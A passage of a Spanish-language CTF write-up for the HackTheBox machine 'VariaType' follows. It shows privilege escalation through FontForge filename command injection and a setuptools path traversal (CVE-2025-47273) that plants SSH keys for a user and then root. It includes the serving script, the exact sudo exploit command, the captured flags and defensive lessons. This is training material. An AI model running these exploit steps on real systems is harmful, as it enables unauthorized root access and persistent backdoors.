+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> ~/.ssh/authorized_keys
+</span></span></code></pre></div><p>Subimos el tarball a la carpeta de uploads. El cron lo recoge y al expandir <code>$file</code> en el codigo Python, la inyeccion se dispara:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="vi">@variatype</span><span class="ss">:/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">python3</span> <span class="n">poc</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="vi">@variatype</span><span class="ss">:/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">mv</span> <span class="n">exploit</span><span class="o">.</span><span class="n">tar</span> <span class="sr">/var/</span><span class="n">www</span><span class="o">/</span><span class="n">portal</span><span class="o">.</span><span class="n">variatype</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="kp">public</span><span class="o">/</span><span class="n">files</span><span class="o">/.</span></span></span></code></pre></div>
+<h3 id="pivote-a-steve">
+  Pivote a steve
+  <a class="heading-link" href="#pivote-a-steve">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Cuando el cron ejecuta FontForge contra nuestro tarball, el nombre malicioso rompe la cadena Python y ejecuta <code>bash /tmp/privesc/s.sh</code>, escribiendo nuestra clave SSH en <code>/home/steve/.ssh/authorized_keys</code>. Nos conectamos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ssh</span> <span class="n">steve</span><span class="vi">@variatype</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">steve</span><span class="vi">@variatype</span><span class="ss">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">758e85</span><span class="n">ba26b1aa169b615a57c7b145ca</span></span></span></code></pre></div>
+<p><strong>Flag de user capturada.</strong></p>
+<h3 id="escalada-a-root-via-cve-2025-47273">
+  Escalada a root via CVE-2025-47273
+  <a class="heading-link" href="#escalada-a-root-via-cve-2025-47273">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Revisamos privilegios de sudo:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">steve</span><span class="vi">@variatype</span><span class="ss">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</span></span><span class="line"><span class="cl"><span class="no">User</span> <span class="n">steve</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="ss">variatype</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="ss">NOPASSWD</span><span class="p">:</span> <span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">python3</span> <span class="sr">/opt/</span><span class="n">font</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">install_validator</span><span class="o">.</span><span class="n">py</span> <span class="o">*</span></span></span></code></pre></div>
+<p>Podemos ejecutar <code>install_validator.py</code> como root con cualquier argumento. Este script descarga un &ldquo;plugin&rdquo; desde una URL usando <code>PackageIndex.download()</code> de <code>setuptools</code> y lo escribe en disco. La version de setuptools (78.1.0) es vulnerable a <strong>CVE-2025-47273</strong>: path traversal mediante <code>%2f</code> en la URL, que permite escribir archivos en cualquier ubicacion del sistema.</p>
+<p>Servimos nuestra clave SSH desde nuestra maquina atacante:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Handler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGEsTWa2oyF51xPMwnUExR6ZrGeUvj8auBUn1AyOVB7o kali@kali</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">HTTPServer</span><span class="p">((</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">80</span><span class="p">),</span> <span class="n">Handler</span><span class="p">)</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span></span></span></code></pre></div>
+<p>Ejecutamos el script con sudo, usando <code>%2f</code> (equivalente a <code>/</code> URL-encoded) para escribir directamente en <code>/root/.ssh/authorized_keys</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">steve</span><span class="vi">@variatype</span><span class="ss">:/</span><span class="n">opt</span><span class="o">/</span><span class="n">font</span><span class="o">-</span><span class="n">tools</span><span class="err">$</span> <span class="n">sudo</span> <span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">python3</span> <span class="sr">/opt/</span><span class="n">font</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">install_validator</span><span class="o">.</span><span class="n">py</span> <span class="p">\</span>
+</span></span><span class="line"><span class="cl">  <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">16</span><span class="o">.</span><span class="mi">29</span><span class="p">:</span><span class="mi">80</span><span class="o">/%</span><span class="mi">2</span><span class="n">froot</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">.</span><span class="n">ssh</span><span class="o">%</span><span class="mi">2</span><span class="n">fauthorized_keys</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2026</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">19</span> <span class="o">[</span><span class="no">INFO</span><span class="o">]</span> <span class="no">Attempting</span> <span class="n">to</span> <span class="n">install</span> <span class="n">plugin</span> <span class="ss">from</span><span class="p">:</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">16</span><span class="o">.</span><span class="mi">29</span><span class="p">:</span><span class="mi">80</span><span class="o">/%</span><span class="mi">2</span><span class="n">froot</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">.</span><span class="n">ssh</span><span class="o">%</span><span class="mi">2</span><span class="n">fauthorized_keys</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2026</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">19</span> <span class="o">[</span><span class="no">INFO</span><span class="o">]</span> <span class="no">Plugin</span> <span class="n">installed</span> <span class="ss">at</span><span class="p">:</span> <span class="sr">/root/</span><span class="o">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
+</span></span><span class="line"><span class="cl"><span class="o">[+]</span> <span class="no">Plugin</span> <span class="n">installed</span> <span class="n">successfully</span><span class="o">.</span></span></span></code></pre></div>
+<p>Nos conectamos como root:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ssh</span> <span class="n">root</span><span class="vi">@variatype</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="vi">@variatype</span><span class="ss">:~</span><span class="c1"># cat root.txt</span>
+</span></span><span class="line"><span class="cl"><span class="mi">60940e678e94265</span><span class="n">f3a75a6c8c4f9c678</span></span></span></code></pre></div>
+<p><strong>Root conseguido.</strong></p>
+<hr>
+<h2 id="resumen-de-la-intrusion">
+  Resumen de la Intrusion
+  <a class="heading-link" href="#resumen-de-la-intrusion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Fase</th>
+          <th>Tecnica</th>
+          <th>Resultado</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Recon</strong></td>
+          <td>ffuf + fuga <code>.git</code> en portal PHP</td>
+          <td>Subdominio <code>portal.variatype.htb</code> y credenciales <code>gitbot</code></td>
+      </tr>
+      <tr>
+          <td><strong>Recon</strong></td>
+          <td>LFI en <code>download.php</code> con bypass <code>....//</code></td>
+          <td><code>/etc/passwd</code> + config nginx + webroot path</td>
+      </tr>
+      <tr>
+          <td><strong>Explotacion</strong></td>
+          <td><strong>CVE-2025-66034</strong> — fontTools varLib XML injection + path traversal en Flask app</td>
+          <td>Webshell PHP escrita en portal → RCE como <code>www-data</code></td>
+      </tr>
+      <tr>
+          <td><strong>Privesc</strong></td>
+          <td><strong>CVE-2024-25082</strong> — Command Injection via filename en FontForge</td>
+          <td>Inyeccion en cron via tarball → clave SSH en <code>steve</code></td>
+      </tr>
+      <tr>
+          <td><strong>Privesc</strong></td>
+          <td><strong>CVE-2025-47273</strong> — Path traversal en <code>PackageIndex.download()</code> de setuptools</td>
+          <td>Clave SSH en <code>/root/.ssh/authorized_keys</code> → shell como root</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="lecciones-aprendidas">
+  Lecciones aprendidas
+  <a class="heading-link" href="#lecciones-aprendidas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ol>
+<li><strong>No exponer <code>.git</code> en produccion</strong>. Las credenciales eliminadas con un nuevo commit siguen accesibles via <code>git fsck</code> y commits huerfanos.</li>
+<li><strong>Dos aplicaciones, dos vectores</strong>. La maquina tiene una app Flask (font generator) y un portal PHP separados. La vulnerabilidad en Flask permitio escribir en el directorio del portal PHP.</li>
+<li><strong>Cuidado con las sustituciones de variables en scripts</strong>. La variable <code>$file</code> expandida directamente en un string Python dentro de FontForge permitio inyeccion de comandos.</li>
+<li><strong>Wildcards en sudo son peligrosos</strong>. <code>install_validator.py *</code> permite pasar rutas arbitrarias, y combinado con <code>PackageIndex.download()</code> vulnerable a path traversal, da acceso root.</li>
+<li><strong><code>os.path.join()</code> con rutas absolutas</strong>: si el segundo argumento es absoluto, descarta el primero. fontTools confiaba en esto para restringir el directorio de salida, pero el atacante especifico una ruta absoluta en el XML.</li>
+</ol>
+<hr>
+<h2 id="flags">
+  Flags
+  <a class="heading-link" href="#flags">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">user: 758e85ba26b1aa169b615a57c7b145ca
+</span></span><span class="line"><span class="cl">root: 60940e678e94265f3a75a6c8c4f9c678
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3 id="también-ver-en-hackthebox">
+        También ver en HackTheBox
+        <a class="heading-link" href="#tambi%c3%a9n-ver-en-hackthebox">
+          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+          <span class="sr-only">Link to heading</span>
+        </a>
+      </h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/principal/">Principal</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/snapped/">Snapped CTF</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/cap/">Cap CTF</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/puppy/">Puppy CTF</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     David León 
+    ·
+    
+    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
